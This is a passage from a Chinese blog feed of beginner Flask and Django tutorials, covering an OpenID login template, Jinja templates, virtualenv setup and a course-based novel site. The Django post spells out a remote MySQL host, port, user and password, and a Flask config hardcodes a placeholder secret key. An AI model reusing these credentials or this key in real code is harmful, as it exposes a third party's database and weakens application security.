class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;login&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">        form.<span class="property">elements</span>[<span class="string">&#x27;openid&#x27;</span>].<span class="property">value</span> = openid</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Sign In<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;form.hidden_tag()&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        Please enter your OpenID:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;&#123;form.openid(size=80)&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;% for error in form.openid.errors %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:red;&quot;</span>&gt;</span>[&#123;&#123;error&#125;&#125;]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &#123;% for pr in providers %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:set_openid(&#x27;&#123;&#123; pr.url &#125;&#125;&#x27;,&#x27;&#123;&#123; pr.name &#125;&#125;&#x27;);&quot;</span>&gt;</span>&#123;&#123; pr.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;form.remember_me&#125;&#125;Remember Me<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login In!&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>其中的form.hidden_tag()会在服务器的返回页面加一段隐藏表单用于验证csrf 还比如像form.field_name里面可以带参数,比如这里要求openid宽度为80</p><h4 id="五处理openids">五:处理openids</h4><p>首先我们得定义一个openids的列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CSRF_ENABLED = True</span><br><span class="line">SECRET_KEY = &#x27;you-will-never-guess&#x27;</span><br><span class="line"></span><br><span class="line">OPENID_PROVIDERS = [</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Google&#x27;, &#x27;url&#x27;: &#x27;https://www.google.com/accounts/o8/id&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Yahoo&#x27;, &#x27;url&#x27;: &#x27;https://me.yahoo.com&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;AOL&#x27;, &#x27;url&#x27;: &#x27;http://openid.aol.com/&lt;username&gt;&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Flickr&#x27;, &#x27;url&#x27;: &#x27;http://www.flickr.com/&lt;username&gt;&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;MyOpenID&#x27;, &#x27;url&#x27;: &#x27;https://www.myopenid.com&#x27; &#125;]</span><br></pre></td></tr></table></figure><p>然后在视图函数里面在加上一个providers=app.config["OPENID_PROVIDERS"],然后按照上面模版里面写的来写就ok了.</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flask学习(2)模版</title>
      <link href="/2017/08/16/flask%E5%AD%A6%E4%B9%A02%E6%A8%A1%E7%89%88/"/>
      <url>/2017/08/16/flask%E5%AD%A6%E4%B9%A02%E6%A8%A1%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>首先先确认一下文件结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">microblog\</span><br><span class="line">flask\</span><br><span class="line">   virtual environment files</span><br><span class="line">app\</span><br><span class="line">   static\</span><br><span class="line">   templates\</span><br><span class="line">   __init__.py</span><br><span class="line">   views.py</span><br><span class="line">tmp\</span><br><span class="line">run.py</span><br></pre></td></tr></table></figure><p>然后如果我们在写站的时候直接写html的话就需要处理转义的问题,而这就涉及到程序的安全问题了,所以flask就给我们配置好了jinja模版.</p><h5 id="一.模版的使用">一.模版的使用</h5><p>模版可以帮我们把网页的布局和逻辑分开 然后我们把动态的内容放在{{...}}里面就ok 比如我们写(app/templates/index.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Miguel&#x27;</span> &#125; <span class="comment"># fake user</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">    title = <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    user = user)</span><br></pre></td></tr></table></figure><h5 id="二.模版中的条件语句">二.模版中的条件语句</h5><p>控制语句,比如我们模版里面可以这么写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样我们在没有传title的时候会自动把题目改成Welcome to microblog</p><h5 id="三.模版里的循环语句">三.模版里的循环语句</h5><p>我们先在视图文件里面写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">     user = &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Miguel&#x27;</span> &#125; <span class="comment"># fake user</span></span><br><span class="line">     posts = [ <span class="comment"># fake array of posts</span></span><br><span class="line">     &#123;</span><br><span class="line">     <span class="string">&#x27;author&#x27;</span>: &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;John&#x27;</span> &#125;,</span><br><span class="line">     <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;Beautiful day in Portland!&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">     <span class="string">&#x27;author&#x27;</span>: &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Susan&#x27;</span> &#125;,</span><br><span class="line">     <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;The Avengers movie was so cool!&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line">     ]</span><br><span class="line">     <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">     title = <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">     user = user,</span><br><span class="line">     posts = posts)</span><br></pre></td></tr></table></figure><p>然后我们去templates里面的index.html里面去写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以进行快速渲染了</p><h5 id="最后模版继承">最后,模版继承</h5><p>抽象的说不太好说,直接用例子说明吧 首先templates里面写一个(app/templates/base.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Microblog: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们在(app/templates/index.html)里面去写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>这就相当于把index.html的block content到endblock中间的东西放到base.html的block content和endblock中间然后返回base.html给用户,这就是模版的继承 终于前面django的坑被填上了....</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flask学习(1)环境以及hello world</title>
      <link href="/2017/08/16/flask%E5%AD%A6%E4%B9%A01%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8Ahello-world/"/>
      <url>/2017/08/16/flask%E5%AD%A6%E4%B9%A01%E7%8E%AF%E5%A2%83%E4%BB%A5%E5%8F%8Ahello-world/</url>
      
        <content type="html"><![CDATA[<p>首先学习的链接<a href="http://www.pythondoc.com/flask-mega-tutorial/index.html">http://www.pythondoc.com/flask-mega-tutorial/index.html</a> 在教程的开头学习到了一个新姿势,在做项目的时候我们可以创建一个<strong>虚拟环境</strong> 创建虚拟环境的好处: 1、<strong>不会影响主环境</strong> 2、<strong>不需要拥有主机的root权限</strong></p><h5 id="一.怎么创建虚拟环境">一.怎么创建虚拟环境:</h5><p>比如我们在桌面创建一个文件夹叫microblog,然后进入目录打开命令窗口,输入 virtualenv  flask,如果没有virtualenv的话就用pip去装一个 然后去Scripts下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ flask\Scripts\pip install flask</span><br><span class="line">$ flask\Scripts\pip install flask-login</span><br><span class="line">$ flask\Scripts\pip install flask-openid</span><br><span class="line">$ flask\Scripts\pip install flask-mail</span><br><span class="line">$ flask\Scripts\pip install flask-sqlalchemy</span><br><span class="line">$ flask\Scripts\pip install sqlalchemy-migrate</span><br><span class="line">$ flask\Scripts\pip install flask-whooshalchemy</span><br><span class="line">$ flask\Scripts\pip install flask-wtf</span><br><span class="line">$ flask\Scripts\pip install flask-babel</span><br><span class="line">$ flask\Scripts\pip install guess_language</span><br><span class="line">$ flask\Scripts\pip install flipflop</span><br><span class="line">$ flask\Scripts\pip install coverage</span><br></pre></td></tr></table></figure><p>然后cd到microblog里面去创建文件结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">mkdir app/static</span><br><span class="line">mkdir app/templates</span><br><span class="line">mkdir tmp</span><br></pre></td></tr></table></figure><p>和上次的django一样,app装应用,static装css和js,templates里面装模版文件 然后给app写一个初始化脚本(app/<strong>init</strong>.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure><p>这个脚本先创建应用,然后导入views,views和之前django里面作用应该是一样的(初学者...) 然后开始写视图函数(app/views.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;Hello,world!&#x27;</span></span><br></pre></td></tr></table></figure><p>最后还需要一个启动脚本run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!flask/bin/python</span></span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line">app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>执行之后去localhost就可以看到hello world了</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初学django</title>
      <link href="/2017/08/01/%E5%88%9D%E5%AD%A6django/"/>
      <url>/2017/08/01/%E5%88%9D%E5%AD%A6django/</url>
      
        <content type="html"><![CDATA[<p>bilibili里面奇遇django开发视频,点进去一看,发现是个零基础教学,于是就自己试着练了练,这里写一篇博客记录一下.最终成果是   <a href="http://novel.tanzhouvip.com/">http://novel.tanzhouvip.com/</a> 当然,这个是一个大佬写的,我只是按照他的操作来练习一下 首先老师强推pycharm,说以后的企业可能会强制要求使用pycharm,所以最好掌握下. 然后两种创建django项目的方法,一种是控制台,另外一种是pycharm创建 (前排声明,首先你的电脑必须有django,否则什么都不用谈了,如果没有就去pip装一个,然后python2或者3都无所谓)</p><h5 id="控制台创建的方法">控制台创建的方法</h5><p>桌面创建一个demo2,然后进去,开控制台 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject xiaoshuo</span><br></pre></td></tr></table></figure><p>然后你的demo2里面就会有一个叫xiaoshuo的项目文件夹,里面包含一个xiaoshuo主程序的文件夹和一个manage.py的主控制文件 其中主程序里面有settings.py(全局设置文件),urls.py(主路由控制文件),views.py(),wsgi部署文件. <img src="/images/2017/07/django-1.png" alt="blacsheep" /> 所有网上的项目的业务逻辑都是由app实现的,django本身没有业务逻辑,所以下面创建应用 控制台cd进入xiaoshuo文件 进入之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py startapp novel</span><br></pre></td></tr></table></figure><p>然后就会有 <img src="/images/2017/07/django-2.png" alt="blacsheep" /> 当然这种方法后面会有问题,这个后面再提</p><h5 id="下面使用pycharm方法来创建django项目">下面使用pycharm方法来创建django项目</h5><p>创建项目,选择配置,创建novel的app和templates模版 <img src="/images/2017/07/django-3.png" alt="blacsheep" /> 创建之后就可以有一个最简单的页面了 <img src="/images/2017/07/django-4.png" alt="blacsheep" /> 甚至还有了后台 <img src="/images/2017/07/django-5.png" alt="blacsheep" /> 然后如果想要把语言设置为中文的话,就去settings里面把language_code从en-us改成zh-hans <img src="/images/2017/07/django-6.png" alt="blacsheep" /> 到这里创建就ok了</p><h4 id="后面简单的学了一下应该写后端...也只是简单地学了一下">后面简单的学了一下应该写后端...也只是简单地学了一下</h4><p>首先先介绍一下每个文件夹吧 <img src="/images/2017/07/django-7.png" alt="blacsheep" /> demo1是项目文件 <strong>init</strong>是将novel这个目录定义成一个包.如果不存在这个文件,那么这个目录就仅仅是一个目录而不是一个包,所以就不可以导入 settings是这个项目的主设置文件,我们还可以增加一些设置文件,但是这个settings是主设置文件 urls是路由文件,路由的作用:相当于映射器,所有的请求都会有路由传给应用然后返回不同页面 wsgi是项目部署服务器的时候的文件 后面的novel是app应用 migrations是app后续映射数据库的一个文件夹 admin是一个管理文件 models是装数据库模型的 views是实现业务逻辑的主要文件 templates一般放在应用中,所以这个直接删掉</p><h4 id="介绍完毕下面开始页面的实现">介绍完毕下面开始页面的实现</h4><p>首先一开始主页我们不能让它是默认的吧,先搞个hello world嘛 搞个页面的话就需要路由来处理,所以我们来看urls文件 <img src="/images/2017/07/django-8.png" alt="blacsheep" /> 里面有个admin文件,交给了admin.site.urls来处理 然后匹配admin的方法是使用正则表达式 下面我们要写一个index页面的话就是相当于页面后面为空,所以我们可以写成这样 <img src="/images/2017/07/django-9.png" alt="blacsheep" /> 但是又需要应用来处理,所以我们要去novel这个应用里面的views去写业务逻辑 <img src="/images/2017/07/django-10.png" alt="blacsheep" /> 有了业务逻辑之后,我们再在urls里面加入导入app,然后在加上业务逻辑,如下 <img src="/images/2017/07/django-11.png" alt="blacsheep" /> 然后我们再去运行一下程序 <img src="/images/2017/07/django-12.png" alt="blacsheep" /> 成功得到了hello world 对了,http.response里面是可以加标签的哟,里面的语句会直接当作html来解析 除此之外,如果做移动平台的开发需要json格式的话 那么还可以导入django.http里面的JsonResponse <img src="/images/2017/07/django-13.png" alt="blacsheep" /> 效果图 <img src="/images/2017/07/django-14.png" alt="blacsheep" /> 然而这些html就由前端人员来开发了,当然有的公司还是要后端来写... 反正都懂的话会好很多嘛.. 这里就用一下老师的前端资源咯 <a href="https://pan.tanzhouvip.com/s/bSIWcerh">https://pan.tanzhouvip.com/s/bSIWcerh</a> 前端会给一个类似云盘里面的文件夹,然后就是由后端人员来开发了</p><h4 id="模拟企业开发">模拟企业开发</h4><h5 id="首页的设置运用render">首页的设置:运用render</h5><p>在app文件夹里面创建一个templates文件夹,当然在根目录创建也可以,不过分app创建更清晰 创建之后把前端给我们的东西放在templates里面,比如index.html 然后我们去novel的views.py里面 <img src="/images/2017/07/django-15.png" alt="blacsheep" /> 这样就有了一个较为标准的主页(当然,静态的样式表js什么的还没有改路径,而且还没有提取数据库的资源) 效果图 <img src="/images/2017/07/django-16.png" alt="blacsheep" /> 很丑...没办法,css还没有载入进去 这里有一个小问题,如果你是用控制台创建的项目的话,可能这里会找不到index.html 原因就是你的项目的settings里面并没有导入应用,导入位置如下图 如果不是用pycharm就不会有novel这一行,手动添加就ok了. <img src="/images/2017/07/django-17.png" alt="blacsheep" /> 然后我们看我们的网页,超级丑有木有,因为css没有正确的导入 怎么导入呢? 所有的web框架都设置有一个静态文件的文件夹(默认为static),放在了settings里面 <img src="/images/2017/07/django-20.png" alt="blacsheep" /> 如果需要可以改成第三方的服务商,然后这个static一般来说是和应用里面的templates模版放在同一个目录 <img src="/images/2017/07/django-18.png" alt="blacsheep" /> 然后由于路径不同,所以依然要进行更改 一种比较笨的方法是把原来index里面的/css/style.css改成../static/css/style.css,然后就可以载入 但是这种方法很笨,不容易维护,所以一般不用,比较好用的方法是什么呢? 我们可以load一个static 比如 <img src="/images/2017/07/django-21.png" alt="blacsheep" /> 然后可以得到的效果是 <img src="/images/2017/07/django-19.png" alt="blacsheep" /> 然后老师说有一种模版的继承,但学生听不懂所以不讲,我也很无奈,先学简单的吧,复杂的等学的好一点了再去看咯 然后拿到静态文件之后就是数据的问题了,因为网站的数据应该是动态的所以我们应该从数据库里面去调取 那么我们就要先把数据库配置一下,去settings.py里面找databases 然后开始修改 ENGINE里面的sqlite3改成mysql(自己用的什么就写什么) NAME改成自己的,下面的同理,这里用老师的资源咯,写novel USER是novel PASSWORD是qiangzi() HOST是mysql.litianqiang.com PORT:7150 如下图 <img src="/images/2017/07/django-22.png" alt="blacsheep" /> 既然有现成的数据库那我们直接在项目的models里面生成数据库的模型就好了 方法:主项目目录开cmd,然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py inspectdb &gt; novel/models.py</span><br></pre></td></tr></table></figure><p>也即把数据库映射到novel的models.py文件中 这里如果python没有装mysql的话会报错,可以去csdn上面去下载然后安装 如果在python里面<code>import MySQLdb</code>没有报错的话就说明安装成功了 完成后输入命令行的命令后你的novel下面的models里面会自动生成数据库的模型 <img src="/images/2017/08/django-23.png" alt="blacsheep" /> 其中模型里面的每一个类代表一个表,每一个表的属性表示列 如果要使用数据库的内容的话,就需要在views里面去调用了,比如下面图片中 <img src="/images/2017/08/django-24.png" alt="blacsheep" /> 首先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from models import NovelCopy</span><br></pre></td></tr></table></figure><p>是引入数据库模型,然后使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NovelCopy.objects.get(限制条件)</span><br></pre></td></tr></table></figure><p>来获取<strong>单条数据</strong>(列),然后输出数据的某个字段,比如这里的novelname字段,输出结果如下图 <img src="/images/2017/08/django-25.png" alt="blacsheep" /> 可以看到输出了小说名称:将夜 如果需要查询多条数据的话,那么可以用filter来替换get,比如我们现在要把主页的四本小说的名字从数据库取出来,那么我们就需要这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">novelCopy=NovelCopy.objects.<span class="built_in">filter</span>().order_by(<span class="string">&#x27;?&#x27;</span>)[:<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>然后输出试试 <img src="/images/2017/08/django-26.png" alt="blacsheep" /> 然后我们要把这些东西传到index.html里面,那么就要用到render的context参数,参数接受一个字典 我们这么写 <img src="/images/2017/08/django-27.png" alt="blacsheep" /> 然后去index.html里面去渲染模版,这里使用for循环 <img src="/images/2017/08/django-28.png" alt="blacsheep" /> 然后热门小说就形成了 <img src="/images/2017/08/django-29.png" alt="blacsheep" /> 到这里django的初步学习就结束了 这里给潭州教育打个广告吧,还确实蛮良心的,老师讲的挺好,而且资源还免费给我们使用 <a 